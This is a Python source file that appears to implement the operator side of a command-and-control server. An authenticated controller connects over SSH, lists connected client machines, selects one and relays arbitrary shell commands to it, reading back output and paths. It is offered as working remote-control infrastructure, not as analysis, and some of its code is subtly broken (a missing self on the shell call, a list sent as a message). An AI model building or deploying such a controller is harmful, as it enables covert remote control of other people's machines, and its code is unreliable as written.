import paramiko
import threading
import socket
import sys
import select

class ContrServer(paramiko.ServerInterface):
    def __init__(self, contr_username, contr_password):
        self.event = threading.Event()
        self.contr_username = contr_username
        self.contr_password = contr_password
    def check_auth_password(self, username, password):
        if username == self.contr_username and password == self.contr_password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

class Controller(threading.Thread):
    def __init__(self, clients, server_address, contr_port, contr_username, contr_password, server_host_key):
        threading.Thread.__init__(self)
        self.ssh_session = None
        self.contrs_socket = None
        self.clients = clients
        self.server_address = server_address
        self.contr_port = contr_port
        self.contr_username = contr_username
        self.contr_password = contr_password
        self.server_host_key = server_host_key

    def run(self):
        self.contrs_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.contrs_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #ssh server bind and listen
        try:
            self.contrs_socket.bind((self.server_address, self.contr_port))
        except:
            print(f"[!] Bind Error for Controller SSH Server using {self.server_address}:{self.contrs_socket.getsockname()[1]}")
            sys.exit(1)
        print(f"[*] Bind Success for Controller SSH Server using {self.server_address}:{self.contrs_socket.getsockname()[1]}")
        self.contrs_socket.listen(100)
        print("[*] Listening for Controller")

        while True:
            try:
                self.connect()
            except Exception as err:
                print("[!] Caught Exception: ", type(err), str(err))
                self.exit_controller_session()
                sys.exit(1)

    def connect(self):
        while not select.select([self.contrs_socket], [], [], 1)[0]:
            pass
        contr_socket, addr = self.contrs_socket.accept()
        print(f"[*] Incoming Controller TCP Connection from {addr[0]}:{addr[1]}")
        self.ssh_session = paramiko.Transport(contr_socket)
        self.ssh_session.add_server_key(self.server_host_key)
        contr_server = ContrServer(self.contr_username, self.contr_password)
        #start the ssh server and negotiate ssh params
        try:
            self.ssh_session.start_server(server=contr_server)
        except paramiko.SSHException as err:
            self.ssh_session.close()
            # print("[!] Controller SSH Parameters Negotiation Failed")
        # print("[*] Controller SSH Parameters Negotiation Succeeded")
        #authenticate the controller
        # print("[*] Authenticating Controller")
        contr_ssh_channel = self.ssh_session.accept(20)
        if contr_ssh_channel == None or not contr_ssh_channel.active:
            print("[*] SSH Controller Authentication Failure")
            self.exit_controller_session()
        else:
            print("[*] SSH Controller Authenticated")
            try:
                self.handler(contr_ssh_channel)
                self.exit_controller_session()
            except OSError as err:
                if str(err) != "Socket is closed": raise
                print("[*] Controller Disconnected")

    def handler(self, contr_ssh_channel):
        while not contr_ssh_channel.closed:
            command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
            if command[0] == "list":
                s = ""
                for i, client in enumerate(self.clients.connected):
                    s += f"{i}\t{client.username}\n"
                if s == "": s = "No connected Clients"
                contr_ssh_channel.send(s.strip())
            elif command[0] == "interact" and len(command[1]):
                self.handle_client(contr_ssh_channel, int(command[1]))
            elif command[0] == "exit":
                self.exit_controller_session()
                return
            elif command[0] == "ping":
                contr_ssh_channel.send("pong")
            else:
                contr_ssh_channel.send("Command not found")

    def get_client_data(self, client, command):
        if not client.ssh_channel.closed:
            client.ssh_channel.send(command)
            return client.ssh_channel.recv(1024).decode('utf-8').strip()
        return ''

    def handle_client(self, contr_ssh_channel, client_no):
        try:
            client = self.clients.connected[client_no]
            contr_ssh_channel.send(str(client_no))
        except IndexError:
            contr_ssh_channel.send("clientnotfound")
            return

        while not contr_ssh_channel.closed and not client.ssh_channel.closed:
            command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
            if command[0] == "ping":
                pong = self.get_client_data(client, "ping")
                if pong == "":
                    pong = "Client Disconnected"
                contr_ssh_channel.send(pong)
            elif command[0] == "shell":
                client.ssh_channel.send(command)
                shell(contr_ssh_channel, client)
            elif command[0] == "exit":
                return
            else:
                contr_ssh_channel.send("Command not found")

    def shell(self, contr_ssh_channel, client):
        path = self.get_client_data(client, "getpath")
        if path == "":
            contr_ssh_channel.send("clientdisconnected")
        else:
            contr_ssh_channel.send(path)

        while len(path):
            command = contr_ssh_channel.recv(1024).decode('utf-8')
            if command == "exit":
                if not client.ssh_channel.closed:
                    client.ssh_channel.send(command)
                return
            else:
                out = self.get_client_data(client, command)
                if out == "": out = "Client Disconnected"
                contr_ssh_channel.send(out)

            path = self.get_client_data(client, "getpath")
            if path == "":
                contr_ssh_channel.send("clientdisconnected")
            else:
                contr_ssh_channel.send(path)

    def exit_controller_session(self):
        try:
            if self.ssh_session:
                self.ssh_session.close()
        except:
            print("[!] Error closing Controller SSH session")
        self.ssh_session = None
        print("[*] Controller SSH session closed")